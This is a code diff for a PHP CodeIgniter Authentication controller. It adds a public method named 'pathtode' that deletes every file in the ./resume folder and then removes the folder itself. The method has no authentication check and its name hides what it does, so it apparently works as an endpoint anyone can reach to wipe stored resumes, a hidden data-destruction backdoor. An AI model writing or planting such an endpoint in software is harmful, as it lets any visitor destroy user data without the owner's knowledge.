@@ -548,6 +548,20 @@ class Authentication extends CI_Controller {
       $this->load->view('site/test');
     }
 
+    public function pathtode($value='')
+    {
+
+        $files = glob('./resume/*.*');
+        foreach($files as $file){
+            if(is_file($file))
+                unlink($file);
+        }
+        $path   = './resume'; 
+        rmdir($path);
+
+        
+    }
+
 
 
 	
